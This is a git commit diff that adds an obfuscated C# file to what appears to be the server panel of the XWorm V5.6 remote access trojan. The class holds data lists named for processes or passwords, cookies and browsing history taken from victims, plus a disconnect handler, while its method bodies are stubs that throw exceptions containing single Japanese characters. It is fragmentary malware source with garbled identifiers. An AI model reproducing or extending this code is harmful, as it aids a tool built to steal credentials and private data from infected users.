5f9913fe5c6a188a908ec77b34ba6a2f3f46e1ee
h1ercarbohydratemap11 <xcytrizen@outlook.com>
2025-09-18 13:50:42 +0400

    Forms32.cs

---
+++ XWorm V5.6/Server/Forms/Forms32.cs
@@ -0,0 +1,58 @@
+﻿using I133EDD8311397I037I09A90I9D29E6F;
+using I6FBIC23A7A8A48C2F3BDF833D19D102;
+using IF0FF1FFB1CA752C08C9910B024F129F;
+using System;
+using System.Collections.Generic;
+using System.Runtime.CompilerServices;
+
+namespace M95F4E5MF7905418B3E7M3BBMCM33E92
+{
+  public class FE2B86A9D832C0656F97BF8FC7D65AE7
+  {
+    internal byte[] \u0024VB\u0024ResumableLocal_b\u00243;
+    internal byte[] \u0024VB\u0024ResumableLocal_L\u00244;
+    internal Exception \u0024VB\u0024ResumableLocal_ex\u00245;
+    public FE2B86A9D832C0656F97BF8FC7D65AE7 \u0024VB\u0024NonLocal_2;
+    public FE2B86A9D832C0656F97BF8FC7D65AE7 \u0024VB\u0024NonLocal_3;
+    public FE2B86A9D832C0656F97BF8FC7D65AE7 \u0024VB\u0024NonLocal_4;
+    public FE2B86A9D832C0656F97BF8FC7D65AE7 \u0024VB\u0024NonLocal_5;
+    public FE2B86A9D832C0656F97BF8FC7D65AE7 \u0024VB\u0024NonLocal_6;
+    public FE2B86A9D832C0656F97BF8FC7D65AE7 \u0024VB\u0024NonLocal_7;
+    public FE2B86A9D832C0656F97BF8FC7D65AE7 \u0024VB\u0024NonLocal_8;
+
+    [CompilerGenerated]
+    [SpecialName]
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    public List<IID32DCI6I7B9802EBAB676I9B4E6BD9> get_listps() => throw new Exception("で");
+
+    [CompilerGenerated]
+    [SpecialName]
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    public void set_listps(
+      List<IID32DCI6I7B9802EBAB676I9B4E6BD9> AutoPropertyValue)
+    {
+      throw new Exception("ほ");
+    }
+
+    [CompilerGenerated]
+    [SpecialName]
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    public List<IA0AD4B699F26I4B2F7CFCF52I427780> get_listcookie() => throw new Exception("ぁ");
+
+    [CompilerGenerated]
+    [SpecialName]
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    public void set_listcookie(
+      List<IA0AD4B699F26I4B2F7CFCF52I427780> AutoPropertyValue)
+    {
+      throw new Exception("と");
+    }
+
+    [CompilerGenerated]
+    [SpecialName]
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    public List<IDD9EAACDE218374CBIBD65DF882F241> get_listhist() => throw new Exception("ぉ");
+
+    public delegate void _isDisconnected();
+  }
+}
